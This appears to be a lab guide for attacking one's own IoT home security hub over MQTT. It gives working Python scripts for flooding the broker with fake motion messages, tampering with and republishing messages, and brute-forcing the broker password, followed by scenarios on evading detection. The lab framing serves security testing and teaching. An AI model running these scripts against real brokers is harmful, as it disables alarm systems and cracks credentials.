1. DoS Attack (MQTT Flooding)
Goal
Overwhelm our Security Hub by flooding fake motion messages.

Setup
Making sure:
•	MQTT broker is running (Mosquitto) 
•	Topic used: 
home/security/motion
Install dependency:
pip install paho-mqtt
Code: dos_attack.py
import paho.mqtt.client as mqtt
import threading
import time
import json
BROKER = "192.168.1.100"   # change to your broker IP
PORT = 1883
TOPIC = "home/security/motion"
NUM_CLIENTS = 20
MESSAGES_PER_SEC = 50
DURATION = 30  # seconds
def flood():
    client = mqtt.Client()
    client.connect(BROKER, PORT, 60)

    end_time = time.time() + DURATION
    while time.time() < end_time:
        payload = json.dumps({"motion": 1})
        client.publish(TOPIC, payload)
        time.sleep(1 / MESSAGES_PER_SEC)
    client.disconnect()
threads = []
for i in range(NUM_CLIENTS):
    t = threading.Thread(target=flood)
    t.start()
    threads.append(t)
for t in threads:
    t.join()
print("DoS Attack Completed")
How to Run
python dos_attack.py
What we See
•	Buzzer triggers continuously 
•	MQTT broker slows down 
•	Real PIR motion becomes useless 

What to Record
•	Message rate spike 
•	Delay in response 
•	CPU/network usage
2. Man-in-the-Middle (MitM Attack)
Goal
Intercept real messages and modify them before reaching system
Idea (Important)
Instead of real network interception (complex), we simulate MitM by:
1.	Subscribing to real topic 
2.	Modifying data 
3.	Republishing fake data
Code: mitm_attack.py
import paho.mqtt.client as mqtt
import json
BROKER = "192.168.1.100"
PORT = 1883
REAL_TOPIC = "home/security/motion"
FAKE_TOPIC = "home/security/motion"
def on_connect(client, userdata, flags, rc):
    print("Connected to broker")
    client.subscribe(REAL_TOPIC)
def on_message(client, userdata, msg):
    try:
        data = json.loads(msg.payload.decode())
        print("Original:", data)
        # Modify data
        data["motion"] = 1   # force motion always
        print("Tampered:", data)
        client.publish(FAKE_TOPIC, json.dumps(data))
    except:
        pass
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(BROKER, PORT, 60)
client.loop_forever()
How to Run
python mitm_attack.py
What we See
•	Even if no motion → buzzer triggers 
•	Data is manipulated in real-time 

What to Record
•	Original vs tampered values 
•	Continuous false alarms 

3. Brute Force Attack (MQTT Password Cracking)
Doing it only after enabling authentication
Step 1: Enable MQTT Authentication
Create password file:
mosquitto_passwd -c password.txt admin
Set password (e.g., 1234)
Edit Mosquitto config:
allow_anonymous false
password_file /path/to/password.txt
Restart broker:
sudo systemctl restart mosquitto

Code: bruteforce_attack.py
import paho.mqtt.client as mqtt
import time
BROKER = "192.168.1.100"
PORT = 1883
USERNAME = "admin"

passwords = ["admin", "1234", "password", "test123", "iot123"]
def try_password(password):
    client = mqtt.Client()
    client.username_pw_set(USERNAME, password)
    try:
        client.connect(BROKER, PORT, 60)
        print(f"[SUCCESS] Password found: {password}")
        return True
    except:
        print(f"[FAILED] {password}")
        return False
for pwd in passwords:
    if try_password(pwd):
        break
    time.sleep(0.5)
How to Run
python bruteforce_attack.py
What we See
[FAILED] admin
[FAILED] password
[SUCCESS] Password found: 1234


What to Record
•	Number of attempts 
•	Time taken 
•	Weak password vulnerability


Full Demonstration Flow
Step 1 — Normal System
•	PIR detects motion → buzzer ON 

Step 2 — DoS Attack
•	Run: 
python dos_attack.py
System overload

Step 3 — MitM Attack
•	Run: 
python mitm_attack.py
Fake motion triggered

Step 4 — Brute Force
•	Enable password 
•	Run: 
python bruteforce_attack.py
Password cracked


---

# 🌌 Advanced IoT Security Simulation Scenarios

These research scenarios utilize the **Network Probe**, **Analysis Engine (IDS)**, and **Internal Audit Logic** to evaluate the boundaries of cyber-physical security.

## Scenario 1: Stealth Denial of Service (DoS)
- **Goal**: Exhaust broker resources without triggering volumetric thresholds.
- **Workflow**: 
    1. Start `sovereign_probe.py` and `sovereign_ids.py`.
    2. Run `dos_attack_advanced.py --adversarial --rate 2 --clients 10`.
- **Research Challenge**: Can the anomaly detection engine identify the subtle increase in payload entropy and TCP retransmissions?

## Scenario 2: Statistical Evasion (High-Fidelity Masking)
- **Goal**: Mask a physical intrusion event using statistical timing jitter.
- **Workflow**:
    1. Start `security_logger.py --label adversarial_masking`.
    2. Run `spoofing_attack.py --mode masking --burst 100`.
- **Research Challenge**: Analyze the `network_intelligence.csv` to identify the specific alarm packet within the masking noise.

## Scenario 3: The "Resilience Audit" (Session Hijacking)
- **Goal**: Test the reliability of the Last Will and Testament (LWT).
- **Workflow**:
    1. Start `sovereign_guard.py`.
    2. Run `heartbeat_loss_sim.py --mode silent`.
- **The Challenge**: Observe how long it takes for the Broker to announce the **OFFLINE** status.

## Scenario 4: The "Signal Scrambler" (RSSI Tampering)
- **Goal**: Correlate physical network interference with cyber-vulnerability.
- **Workflow**:
    1. Start the Intelligent Hub (`Security_hub.ino`).
    2. Introduce a wireless obstruction between the ESP32 and the Router.
- **The Challenge**: Map the `wifi_rssi` drop points against the `reconnect_count`. At what Signal Strength does the Hub finally lose its cyber-link?

